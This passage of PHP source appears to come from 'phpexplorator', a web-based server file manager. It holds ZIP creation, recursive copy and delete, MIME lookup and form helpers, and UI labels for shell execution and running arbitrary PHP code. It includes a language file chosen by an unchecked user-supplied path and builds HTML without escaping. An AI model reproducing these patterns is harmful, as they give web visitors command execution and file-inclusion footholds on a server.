    $PE_language["php_info"] = "PHP Info";
    $PE_language["php_info"] = "Php Info";
    $PE_language["print_r"] = "PHP Print Array ";
    $PE_language["property"] = "Property";
    $PE_language["rename"] = "Rename to";
    $PE_language["rm_dir"] = "Delete folder";
    $PE_language["run_code"] = "Run PHP code";
    $PE_language["set_grp"] = "Change group to";
    $PE_language["set_mod"] = "Set Permission to";
    $PE_language["set_own"] = "Change owner to";
    $PE_language["set_touch"] = "Touch to";
    $PE_language["sha1_file"] = "Sha1 file";
    $PE_language["sha1_text"] = "Sha1 text";
    $PE_language["shell_exec"] = "Shell execution";
    $PE_language["str_rot13_file"] = "string rotation file";
    $PE_language["str_rot13_text"] = "string rotation text";
    $PE_language["str_word_count_file"] = "Word count in file";
    $PE_language["stripslashes_file"] = "Strip slashes in file";
    $PE_language["strlen_file"] = "Char count file";
    $PE_language["strrev_file"] = "string reverse file";
    $PE_language["system"] = "System";
    $PE_language["unzip"] = "UnZip";
    $PE_language["unzip_to"] = "Unzip to";
    $PE_language["urldecode_file"] = "Url decode file";
    $PE_language["urldecode_text"] = "Url decode text";
    $PE_language["urlencode_file"] = "Url encode file";
    $PE_language["urlencode_text"] = "Url encode text";
    $PE_language["var_dump"] = "PHP Dump a Var ";
    $PE_language["var_export"] = "PHP Export a Var ";
    $PE_language["zip"] = "Zip file";
    $PE_language["zip_all"] = "Zip";

    $PE_language["dir"] = "Dir";
    $PE_language["other"] = "Other";

    $PE_language["total_size"] = "Total Size";
    $PE_language["total_object"] = "Total object";
    $PE_language["total_dir"] = "Total Directories";
    $PE_language["total_files"] = "Total Files";
    $PE_language["stream"] = "Stream";
    $PE_language["js_message1"] = "!!! CLOSE YOUR BROWSER to cancel the ";
    $PE_language["js_message2"] = " action or click [OK] to continue !!!";


    $PE_language["replace"] = "Find/replace";
    $PE_language["sensitive"] = "case sensitive";
    $PE_language["regular_expression"] = "regular expression";
    $PE_language["recursive"] = "recursive";
    $PE_language["find_only"] = "find_only";
    $PE_language["code"] = "code";
    $PE_language["alphanumeric"] = "alphanumeric characters";
    $PE_language["alphabetic"] = "alphabetic characters";
    $PE_language["space_tab"] = "space or tab characters only";
    $PE_language["control"] = "control characters";
    $PE_language["numeric"] = "numeric characters";
    $PE_language["printable"] = "printable and visible characters";
    $PE_language["lower_case"] = "lower-case alphabetic characters";
    $PE_language["printable_control"] = "printable (non-control) characters";
    $PE_language["punctuation"] = "punctuation characters";
    $PE_language["all_whitespace"] = "all whitespace chars";
    $PE_language["upper_case"] = "upper-case alphabetic characters";
    $PE_language["hexadecimal"] = "hexadecimal digit characters";
    $PE_language["match "] = "match ";
    $PE_language["replace "] = "replace ";
    $PE_language["php_code"] = "php code";
    $PE_language["backup"] = "backup";
    $PE_language["input"] = "input";
    $PE_language["local_file"] = "local_file";
    $PE_language["local_zip"] = "local_zip";
    $PE_language["remote_file"] = "remote_file";
    $PE_language["remote_zip"] = "remote_zip";
    $PE_language["remote_folder"] = "remote_folder";
    $PE_language["output"] = "output";

    $PE_language["download"] = "download";
    $PE_language["remote_folder"] = "remote_folder";
    $PE_language["remote_zip"] = "remote_zip";
    $PE_language["print"] = "print";
    $PE_language["match_text"] = "match text:";
    $PE_language["replace_text"] = "replace text:";
    $PE_language["reset_form"] = "confirm that you want to empty this form";
    $PE_language["submit"] = "Searh/Replace";
    $PE_language["submit_java"] = "confirm that you want to Run";


    $_SESSION["PE_current_lang"] = PE_getpost("PE_select_lang");
//     $PE_language["encoding"] = PE_getpost("PE_select_encoding");
    $_SESSION["PE_current_encoding"] = PE_translate("encoding");



    if((!empty($_SESSION["PE_current_lang"])) && file_exists($PE_config["lang_path"] . "/" . $_SESSION["PE_current_lang"] . "/language.php")){
        include($PE_config["default_stream"] . $PE_config["lang_path"] . "/" . $_SESSION["PE_current_lang"] . "/language.php"); //--language file
        $_SESSION["PE_current_language"] = $_SESSION["PE_current_lang"];
    } elseif(!empty($_SESSION["PE_current_language"]) && (file_exists($PE_config["lang_path"] . "/" . $_SESSION["PE_current_language"] . "/language.php"))){
        include($PE_config["default_stream"] . $PE_config["lang_path"] . "/" . $_SESSION["PE_current_language"] . "/language.php"); //--language file
    } elseif(file_exists($PE_config["lang_path"] . "/" . $PE_config["PE_current_language"] . "/language.php")){
        include($PE_config["default_stream"] . $PE_config["lang_path"] . "/" . $PE_config["PE_current_language"] . "/language.php"); //--language file
    }

    return $PE_language;
}

/**
* PE_mime_type()
* return the mine type of a file extension
*
* @param string $file_ext
* @return
*/
function PE_mime_type($file_ext = "")
{
    $array_return = array();

    switch (strtolower($file_ext)){
        case "ez" : $ctype = "application/andrew-inset";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "atom" : $ctype = "application/atom+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "hqx" : $ctype = "application/mac-binhex40";
            $image = "text.png";
            $editor = "text";
            break;
        case "cpt" : $ctype = "application/mac-compactpro";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "mathml" : $ctype = "application/mathml+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "doc" : $ctype = "application/msword";
            $image = "doc.png";
            $editor = "word";
            break;
        case "com":
        case "bin":
        case "msi":
        case "class":
        case "exe" : $ctype = "application/octet-stream";
            $image = "executable.png";
            $editor = "unknown";
            break;
        case "dms":
        case "lha":
        case "lzh":
        case "so":
        case "sys":
        case "dll":
        case "dmg" : $ctype = "application/octet-stream";
            $image = "system.png";
            $editor = "unknown";
            break;
        case "oda" : $ctype = "application/oda";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "ogg" : $ctype = "application/ogg";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "pdf" : $ctype = "application/pdf";
            $image = "pdf.png";
            $editor = "unknown";
            break;
        case "ai":
        case "eps":
        case "ps" : $ctype = "application/postscript";
            $image = "ps.png";
            $editor = "unknown";
            break;
        case "rdf" : $ctype = "application/rdf+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "smi":
        case "smil" : $ctype = "application/smil";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "gram" : $ctype = "application/srgs";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "grxml" : $ctype = "application/srgs+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "mif" : $ctype = "application/vnd.mif";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "xul" : $ctype = "application/vnd.mozilla.xul+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "xls" : $ctype = "application/vnd.ms-excel";
            $image = "spreadsheet.png";
            $editor = "excell";
            break;
        case "ppt" : $ctype = "application/vnd.ms-powerpoint";
            $image = "presentation.png";
            $editor = "unknown";
            break;
        case "rm" : $ctype = "application/vnd.rn-realmedia";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "wbxml" : $ctype = "application/vnd.wap.wbxml";
            $image = "text.png";
            $editor = "text";
            break;
        case "wmlc":
        case "wmlc" : $ctype = "application/vnd.wap.wmlc";
            $image = "text.png";
            $editor = "text";
            break;
        case "wmlsc":
        case "wmlsc" : $ctype = "application/vnd.wap.wmlscriptc";
            $image = "text.png";
            $editor = "text";
            break;
        case "vxml" : $ctype = "application/voicexml+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "bcpio" : $ctype = "application/x-bcpio";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "vcd" : $ctype = "application/x-cdlink";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "pgn" : $ctype = "application/x-chess-pgn";
            $image = "text.png";
            $editor = "text";
            break;
        case "csh" : $ctype = "application/x-csh";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "dcr":
        case "dir":
        case "dxr" : $ctype = "application/x-director";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "dvi" : $ctype = "application/x-dvi";
            $image = "dvi.png";
            $editor = "unknown";
            break;
        case "spl" : $ctype = "application/x-futuresplash";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "gtar" : $ctype = "application/x-gtar";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "hdf" : $ctype = "application/x-hdf";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "php":
        case "php4":
        case "php3":
        case "phtml" : $ctype = "application/x-httpd-php";
            $image = "script.png";
            $editor = "text";
            break;
        case "phps" : $ctype = "application/x-httpd-php-source";
            $image = "script.png";
            $editor = "text";
            break;
        case "js" : $ctype = "application/x-javascript";
            $image = "script.png";
            $editor = "text";
            break;
        case "skp":
        case "skd":
        case "skt":
        case "skm" : $ctype = "application/x-koan";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "latex" : $ctype = "application/x-latex";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "nc":
        case "cdf" : $ctype = "application/x-netcdf";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "crl" : $ctype = "application/x-pkcs7-crl";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "sh" : $ctype = "application/x-sh";
            $image = "terminal.png";
            $editor = "text";
            break;
        case "shar" : $ctype = "application/x-shar";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "swf" : $ctype = "application/x-shockwave-flash";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "sit" : $ctype = "application/x-stuffit";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "sv4cpio" : $ctype = "application/x-sv4cpio";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "sv4crc" : $ctype = "application/x-sv4crc";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "cpio" : $ctype = "application/x-cpio";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "zip" : $ctype = "application/zip";
            $image = "compressed.png";
            $editor = "unknown";
            break;
        case "tgz":
        case "bz2":
        case "gz":
        case "tar" : $ctype = "application/x-tar";
            $image = "tar.png";
            $editor = "unknown";
            break;
        case "tcl" : $ctype = "application/x-tcl";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "tex" : $ctype = "application/x-tex";
            $image = "tex.png";
            $editor = "unknown";
            break;
        case "texinfo":
        case "texi" : $ctype = "application/x-texinfo";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "t":
        case "tr":
        case "roff" : $ctype = "application/x-troff";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "man" : $ctype = "application/x-troff-man";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "me" : $ctype = "application/x-troff-me";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "ms" : $ctype = "application/x-troff-ms";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "ustar" : $ctype = "application/x-ustar";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "src" : $ctype = "application/x-wais-source";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "crt" : $ctype = "application/x-x509-ca-cert";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "xhtml":
        case "xht" : $ctype = "application/xhtml+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "xml":
        case "xsl" : $ctype = "application/xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "dtd" : $ctype = "application/xml-dtd";
            $image = "text.png";
            $editor = "text";
            break;
        case "xslt" : $ctype = "application/xslt+xml";
            $image = "text.png";
            $editor = "text";
            break;
        case "au":
        case "snd" : $ctype = "audio/basic";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "mid":
        case "midi":
        case "kar" : $ctype = "audio/midi";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "avi":
        case "mpga":
            $ctype = "audio/mpeg";
            $image = "movie.png";
            $editor = "video";
            break;
        case "mp2":
        case "mp3":
            $ctype = "audio/mpeg";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "aif":
        case "aiff":
        case "aifc" : $ctype = "audio/x-aiff";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "m3u" : $ctype = "audio/x-mpegurl";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "ram":
        case "ra" : $ctype = "audio/x-pn-realaudio";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "wav" : $ctype = "audio/x-wav";
            $image = "sound1.png";
            $editor = "audio";
            break;
        case "pdb" : $ctype = "chemical/x-pdb";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "xyz" : $ctype = "chemical/x-xyz";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "bmp" : $ctype = "image/bmp";
            $image = "image1.png";
            $editor = "image";
            break;
        case "cgm" : $ctype = "image/cgm";
            $image = "image1.png";
            $editor = "image";
            break;
        case "gif" : $ctype = "image/gif";
            $image = "image1.png";
            $editor = "image";
            break;
        case "ief" : $ctype = "image/ief";
            $image = "image1.png";
            $editor = "image";
            break;
        case "jpeg":
        case "jpg":
        case "jpe" : $ctype = "image/jpeg";
            $image = "image1.png";
            $editor = "image";
            break;
        case "png" : $ctype = "image/png";
            $image = "image1.png";
            $editor = "image";
            break;
        case "svg" : $ctype = "image/svg+xml";
            $image = "image1.png";
            $editor = "image";
            break;
        case "tiff":
        case "tif" : $ctype = "image/tiff";
            $image = "image1.png";
            $editor = "image";
            break;
        case "djvu":
        case "djv" : $ctype = "image/vnd.djvu";
            $image = "image1.png";
            $editor = "image";
            break;
        case "wbmp":
        case "wbmp" : $ctype = "image/vnd.wap.wbmp";
            $image = "image1.png";
            $editor = "image";
            break;
        case "ras" : $ctype = "image/x-cmu-raster";
            $image = "image1.png";
            $editor = "image";
            break;
        case "ico" : $ctype = "image/x-icon";
            $image = "image1.png";
            $editor = "image";
            break;
        case "pnm" : $ctype = "image/x-portable-anymap";
            $image = "image1.png";
            $editor = "image";
            break;
        case "pbm" : $ctype = "image/x-portable-bitmap";
            $image = "image1.png";
            $editor = "image";
            break;
        case "pgm" : $ctype = "image/x-portable-graymap";
            $image = "image1.png";
            $editor = "image";
            break;
        case "ppm" : $ctype = "image/x-portable-pixmap";
            $image = "image1.png";
            $editor = "image";
            break;
        case "rgb" : $ctype = "image/x-rgb";
            $image = "image1.png";
            $editor = "image";
            break;
        case "xbm" : $ctype = "image/x-xbitmap";
            $image = "image1.png";
            break;
        case "xpm" : $ctype = "image/x-xpixmap";
            $image = "image1.png";
            $editor = "image";
            break;
        case "xwd" : $ctype = "image/x-xwindowdump";
            $image = "image1.png";
            $editor = "image";
            break;
        case "igs":
        case "iges" : $ctype = "model/iges";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "msh":
        case "mesh":
        case "silo" : $ctype = "model/mesh";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "wrl":
        case "vrml" : $ctype = "model/vrml";
            $image = "unknown.png";
            $editor = "unknown";
            break;
        case "ics":
        case "ifb" : $ctype = "text/calendar";
            $image = "text.png";
            $editor = "text";
            break;
        case "css" : $ctype = "text/css";
            $image = "html.png";
            $editor = "text";
            break;
        case "shtml":
        case "html":
        case "htm" : $ctype = "text/html";
            $image = "html.png";
            $editor = "text";
            break;
        case "cgi":
        case "sql":
        case "bak":
        case "pas":
        case "inf":
        case "ini":
        case "asc":
        case "txt" : $ctype = "text/plain";
            $image = "text.png";
            $editor = "text";
            break;
        case "bat" : $ctype = "text/script";
            $image = "terminal.png";
            $editor = "text";
            break;
        case "c" : $ctype = "text/plain";
            $image = "c.png";
            $editor = "text";
            break;
        case "f" : $ctype = "text/plain";
            $image = "f.png";
            $editor = "text";
            break;
        case "p" : $ctype = "text/plain";
            $image = "p.png";
            $editor = "text";
            break;
        case "rtx" : $ctype = "text/richtext";
            $image = "text.png";
            $editor = "text";
            break;
        case "rtf" : $ctype = "text/rtf";
            $image = "text.png";
            $editor = "text";
            break;
        case "sgml":
        case "sgm" : $ctype = "text/sgml";
            $image = "text.png";
            $editor = "text";
            break;
        default: $ctype = "application/force-download";
            $image = "unknown.png";
            $editor = "unknown";
            break;
    }

    $array_return["image"] = $image;
    $array_return["editor"] = $editor;
    $array_return["type"] = $ctype;
    return $array_return;
}
/**
* PE_zipfiles()
*
* return a compressed zip data
* $array_files_dirs_to_zip is an array of absolute paths, see getdirectorycontent()
* $parent_dir_all_files is an absolute path of a folder which contains all files and folder to be zip
* $file_name_encoding is the encoding of filenames in the zip data
*
* @param mixed $array_files_dirs_to_zip
* @param mixed $parent_dir_all_files
* @param string $file_name_encoding
* @return
*/
function PE_zipfiles($array_files_dirs_to_zip, $parent_dir_all_files, $file_name_encoding = "UTF-8")
{
    $datasec = array();
    $ctrl_dir = array();
    $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    $old_offset = 0;

    foreach($array_files_dirs_to_zip as $key => $value){
        $name = substr($value, strlen($parent_dir_all_files) + 1);
        $name = mb_convert_encoding($name, $file_name_encoding, "auto");

        if(is_dir($value)){
            $fr = "\x50\x4b\x03\x04";
            $fr .= "\x0a\x00";
            $fr .= "\x00\x00";
            $fr .= "\x00\x00";
            $fr .= "\x00\x00\x00\x00";
            $fr .= pack("V", 0);
            $fr .= pack("V", 0);
            $fr .= pack("V", 0);
            $fr .= pack("v", strlen($name));
            $fr .= pack("v", 0);
            $fr .= $name;
            // $fr .= pack("V", 0);
            // $fr .= pack("V", 0);
            // $fr .= pack("V", 0);
            $datasec[] = $fr;

            $new_offset = strlen(implode("", $datasec));
            $cdrec = "\x50\x4b\x01\x02";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x0a\x00";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x00\x00\x00\x00";
            $cdrec .= pack("V", 0);
            $cdrec .= pack("V", 0);
            $cdrec .= pack("V", 0);
            $cdrec .= pack("v", strlen($name));
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $ext = "\x00\x00\x10\x00";
            $ext = "\xff\xff\xff\xff";
            $cdrec .= pack("V", 16);
            $cdrec .= pack("V", $old_offset);
            $cdrec .= $name;
            $ctrl_dir[] = $cdrec;
            $old_offset = $new_offset;
        }else{
            $data = file_get_contents($value);

            $unc_len = strlen($data);
            $crc = crc32($data);
            $zdata = gzcompress($data);
            $zdata = substr($zdata, 2, -4);
            $c_len = strlen($zdata);

            $fr = "\x50\x4b\x03\x04";
            $fr .= "\x14\x00";
            $fr .= "\x00\x00";
            $fr .= "\x08\x00";
            $fr .= "\x00\x00\x00\x00";
            $fr .= pack("V", $crc);
            $fr .= pack("V", $c_len);
            $fr .= pack("V", $unc_len);
            $fr .= pack("v", strlen($name));
            $fr .= pack("v", 0);
            $fr .= $name;
            $fr .= $zdata;
            // $fr .= pack("V", $crc);
            // $fr .= pack("V", $c_len);
            // $fr .= pack("V", $unc_len);
            $datasec[] = $fr;

            $new_offset = strlen(implode("", $datasec));
            $cdrec = "\x50\x4b\x01\x02";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x14\x00";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x08\x00";
            $cdrec .= "\x00\x00\x00\x00";
            $cdrec .= pack("V", $crc);
            $cdrec .= pack("V", $c_len);
            $cdrec .= pack("V", $unc_len);
            $cdrec .= pack("v", strlen($name));
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $cdrec .= pack("v", 0);
            $cdrec .= pack("V", 32);
            $cdrec .= pack("V", $old_offset);
            $old_offset = $new_offset;
            $cdrec .= $name;
            $ctrl_dir[] = $cdrec;
        }
    }

    $data = implode("", $datasec);
    $ctrldir = implode("", $ctrl_dir);

    return
    $data . $ctrldir . $eof_ctrl_dir .
    pack("v", sizeof($ctrl_dir)) .
    pack("v", sizeof($ctrl_dir)) .
    pack("V", strlen($ctrldir)) .
    pack("V", strlen($data)) . "\x00\x00";
}
/**
* PE_getdir_all()
* receive an array of files and folders path and return recursively an array with all files and folders in these path structture
*
* @param mixed $PE_config
* @param mixed $array_path
* @param string $only_property
* @return
*/
function PE_getdir_all($PE_config, $array_path, $only_property = "")
{
    $array_path = is_array($array_path) ? $array_path:array($array_path);
    $array_content = array();
    $array_type = array();
    $array_len = array();
    $pile_dir = array();
    $num_files = 0;
    // print_r($PE_config["max_num_files"]);exit;
    foreach($array_path as $path){
        $path = realpath((urldecode($path)));
        array_unshift($pile_dir, $path);

        while ((count($pile_dir) > 0) && ($num_files < $PE_config["max_num_files"])){
            $the_path = array_shift($pile_dir);
            if(!is_dir($the_path)){
                $array_content[] = realpath($the_path);
                $array_type[] = "file";
                $array_len[] = empty($only_property)?strlen($the_path):filesize($the_path);
                $num_files++;
            } elseif(is_dir($the_path)){
                $array_content[] = realpath($the_path);
                $array_type[] = "dir";
                $array_len[] = empty($only_property)?strlen($the_path):filesize($the_path);
                $num_files++;
                $dir = opendir($the_path);

                while ($file = readdir($dir)){
                    if(($file != ".") && ($file != "..")){
                        $array_content[] = realpath($the_path . "/" . $file);
                        $array_len[] = empty($only_property)?strlen(realpath($the_path . "/" . $file)):filesize(realpath($the_path . "/" . $file));
                        $num_files++;
                        if(is_dir($the_path . "/" . $file)){
                            array_unshift($pile_dir, $the_path . "/" . $file);
                            $array_type[] = "dir";
                        }else{
                            $array_type[] = "file";
                        }
                    }
                }
                closedir($dir);
            }
        }
    };

    if(!empty($only_property)){
        return array("total" => count($array_type), "total_size" => array_sum($array_len), "count" => array_count_values($array_type));
    }

    array_multisort($array_type, SORT_ASC, SORT_STRING, $array_len, SORT_ASC, SORT_STRING, $array_content, SORT_ASC, SORT_STRING);

    return array_unique($array_content);
}
/**
* PE_export()
* receive a file stream contents and send it to the browser (download)
*
* @param mixed $stream_data
* @param string $final_name
* @param string $file_extention
* @return
*/
function PE_export($stream_data = "", $final_name = "", $file_extention = "txt")
{
    $final_name = empty($final_name)?"phpexplorator_export_" . date($PE_config["date_format"]) . "." . $file_extention : $final_name;
    $stream_data = empty($stream_data)?"\n" : $stream_data;
    $return_type = PE_mime_type(str_replace(".", "", $file_extention));
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: private", false);
    header("Pragma: public");
    header("Expires: 0");
    header("Content-Type: " . $return_type["type"]);
    header("Content-Disposition: attachment; filename=\"" . basename($final_name) . "\";");
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: " . strlen($stream_data));
    set_time_limit(0);
    print($stream_data);
    exit;

    return false;
}
/**
* PE_get_files()
* return the compress stream of all files and folders received in an array
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param mixed $input_data
* @param string $input_type
* @param string $compress_methop
* @return
*/
function PE_get_files($PE_config, $PE_thevar, $input_data , $input_type = "one_file", $compress_methop = "txt")
{
    switch ($compress_methop){
        case "gz":
        case "bz2":
        case "zip":
            switch ($input_type){
                case "one_file":
                    $input_data = realpath($input_data);
                    $stream_data = PE_zipfiles(array($input_data), realpath($PE_thevar["PE_current_dir"] . "/"), "UTF-8");
                    $final_name = basename($input_data) . ".zip";
                    PE_export($stream_data, $final_name, "zip");
                    break;

                case "one_folder":
                    $array_files = PE_getdir_all($PE_config, $input_data);
                    $stream_data = PE_zipfiles($array_files, realpath($input_data . "/../") , "UTF-8");
                    $final_name = basename($input_data) . ".zip";
                    PE_export($stream_data, $final_name, "zip");
                    break;

                case "files_folders":
                    $array_files = PE_getdir_all($PE_config, $input_data);
                    $stream_data = PE_zipfiles($array_files, realpath($PE_thevar["PE_current_dir"] . "/../"), "UTF-8");
                    $final_name = basename($PE_thevar["PE_current_dir"]) . ".zip";
                    PE_export($stream_data, $final_name, "zip");
                    break;
                case "base64":
                    PE_export(base64_decode($input_data), "", "zip");
                    break;
                case "stream_data":
                    PE_export($input_data, "", "zip");
                    break;

                default:
                    break;
            }
            break;

        case "txt":
        default:
            switch ($input_type){
                case "one_file":
                    $stream_data = file_get_contents($PE_thevar["PE_current_stream"] . $input_data);
                    $data_info = pathinfo($input_data);
                    $final_name = basename($input_data);
                    PE_export($stream_data, $final_name, $data_info["extension"]);
                    break;

                case "one_folder":
                    break;

                case "files_folders":
                    break;

                case "base64":
                    PE_export(base64_decode($input_data), "", "txt");
                    break;
                case "stream_data":
                    PE_export($input_data, "", "txt");
                    break;

                default:
                    break;
            }
            break;
    }
    return true;
}
/**
* PE_copy()
* copy source file to destination
*
* @param mixed $source
* @param mixed $dest
* @return
*/
function PE_copy($source, $dest)
{
    if(!empty($dest)){
        $source = realpath(($source));
        $dest = ($dest);
        if($source == $dest){
            return true;
        } elseif(is_dir($dest)){
            return copy($source, ($dest . "/" . basename($source)));
        }else{
            return copy($source, $dest);
        }
    }
    return true;
}
/**
* PE_dir_copy()
* copy source folder to destination
*
* @param mixed $PE_config
* @param mixed $source
* @param mixed $dest
* @return
*/
function PE_dir_copy($PE_config, $source, $dest)
{
    if((is_dir($source) && (!is_dir($dest)))){
        mkdir($dest);
    }
    $source = realpath((($source)));
    $dest = ((($dest)));
    $base_dir = substr($source, 0, strlen($source) - strlen(basename($source)));
    $base_dir = realpath($base_dir);
    if($source == $dest){
        return true;
    } elseif(!is_dir($source)){
        return PE_copy($source, $dest);
    }else{
        $array_source = PE_getdir_all($PE_config, $source);
        foreach($array_source as $value){
            if(is_dir($value)){
                if(mkdir(($dest . "/" . substr($value, strlen($base_dir), strlen($value))))){
                    print("<br /> Creating dir [" . realpath($dest . "/" . substr($value, strlen($base_dir), strlen($value))) . "];");
                }else{
                    print("<br /> Dir [" . ($dest . "/" . substr($value, strlen($base_dir), strlen($value))) . "] can't be created !!?;");
                }
            }
        }
        $array_source = PE_getdir_all($PE_config, $source);
        foreach($array_source as $value){
            if(!is_dir($value)){
                if(copy(realpath($value), ($dest . "/" . substr($value, strlen($base_dir), strlen($value))))){
                    print("<br /> Copying File [" . realpath($value) . "] -> [" . realpath($dest . "/" . substr($value, strlen($base_dir), strlen($value))) . "];");
                }else{
                    print("<br /> File [" . realpath($value) . "] can't be copy to -> [" . ($dest . "/" . substr($value, strlen($base_dir), strlen($value))) . "]!!?;");
                }
            }
        }
    }

    return true;
}
/**
* PE_dir_remove()
* remove a folder
*
* @param mixed $PE_config
* @param mixed $source_dir
* @return
*/
function PE_dir_remove($PE_config, $source_dir)
{
    if((!$source_dir) || (realpath($source_dir) == realpath(".")) || (realpath($source_dir) == realpath("..")) || (realpath($source_dir) == realpath("/"))){
        print("<br />  [" . $source_dir . "]; can't be removed !!?");
        return false;
    }
    $source_dir = realpath(($source_dir));
    if(!is_dir($source_dir)){
        return unlink($source_dir);
    }else{
        $array_source = PE_getdir_all($PE_config, $source_dir);
        foreach($array_source as $value){
            if(!is_dir($value)){
                if(unlink($value)){
                    print("<br /> File [" . $value . "]; deleted");
                }else{
                    print("<br /> File [" . $value . "]; can't be deleted !!?");
                }
            }
        }

        $i = 5;
        $finish = false;
        while (!$finish || ($i > 5)){
            $finish = true;
            $i--;
            $array_source = PE_getdir_all($PE_config, $source_dir);
            $array_source = array_reverse($array_source);
            foreach($array_source as $value){
                if(is_dir($value)){
                    if(rmdir($value)){
                        print("<br /> Dir [" . $value . "] removed;");
                    }else{
                        $finish = false;
                        print("<br /> Dir [" . $value . "]; can't be removed !!?");
                    }
                }
            }
        }
    }
    return true;
}
/**
* PE_dir_move()
* move a folder
*
* @param mixed $PE_config
* @param mixed $source
* @param mixed $dest
* @return
*/
function PE_dir_move($PE_config, $source, $dest)
{
    if(realpath($source) == realpath($dest)){
        return true;
    }else{
        if(PE_dir_copy($PE_config, $source, $dest)){
            return PE_dir_remove($PE_config, $source);
        };
    }
    return true;
}
/**
* PE_form($PE_config, )
* to create fastly a small html form
*
* @param string $val_submit
* @param string $val_type1
* @param string $val_name1
* @param string $val_value1
* @param string $val_type2
* @param string $val_name2
* @param string $val_value2
* @param string $val_type3
* @param string $val_name3
* @param string $val_value3
* @return
*/
function PE_form($PE_config = array(), $val_submit = "Go", $val_type1 = "text", $val_name1 = "PE_the_file", $val_value1 = "./", $val_type2 = "text", $val_name2 = "PE_the_value", $val_value2 = "./", $val_type3 = "", $val_name3 = "", $val_value3 = "")
{
    $form_str = "";
    $form_str .= "<form method=\"post\" action=" . $_SERVER["PHP_SELF"] . " >";
//     $form_str .= "<input type=\"hidden\" name=\"" . $PE_config["PE_key"] . "\" value=\"" . $PE_config["PE_val"] . "\" /> ";
    $form_str .= "<input type=\"" . $val_type1 . "\" name=\"" . $val_name1 . "\" value=\"" . $val_value1 . "\" /> ";
    $form_str .= "<input type=\"" . $val_type2 . "\" name=\"" . $val_name2 . "\" value=\"" . $val_value2 . "\" /> ";
    $form_str .= "<input type=\"submit\" value=\"" . $val_submit . "\" /> ";
    if(!empty($val_name3)){
        $form_str .= "<input type=\"" . $val_type3 . "\" name=\"" . $val_name3 . "\" value=\"" . $val_value3 . "\" /> ";
    }
    $form_str .= "</form> ";
    return $form_str;
}/**
* PE_form($PE_config, )
* to create fastly a small html form
* @param mixed $PE_config
* @param mixed $PE_thevar
* @return
*/
function PE_stream_select($PE_config = array(), $PE_thevar = array())
{
?>
  <select name="PE_stream" >
         <optgroup label="--">
         <option value="<?php print($PE_thevar["PE_current_stream"]);
            ?>" selected><?php print($PE_thevar["PE_current_stream"]);?></option>
         <option value="">default</option>
         <option value=""></option>
         <option value="file://">file://</option>
         <option value="ftp://">ftp://</option>
         <option value="ftps://">ftps://</option>
         <option value=":http://">http://</option>
         <option value=":https://">https://</option>
         <option value="ssl://">ssl://</option>
         <option value="tsl://">tsl://</option>
         <option value="data://">data://</option>
         </optgroup>
         <optgroup label="- unix -">
         <option value="unix://">unix://</option>
         <option value="udg://">udg://</option>
         </optgroup>
         <optgroup label="- compress -">
         <option value="compress.zlib://">compress.zlib://</option>
         <option value="compress.bzip2://">compress.bzip2://</option>
         </optgroup>
         <optgroup label="- php -">
         <option value="php://stderr">php://stderr</option>
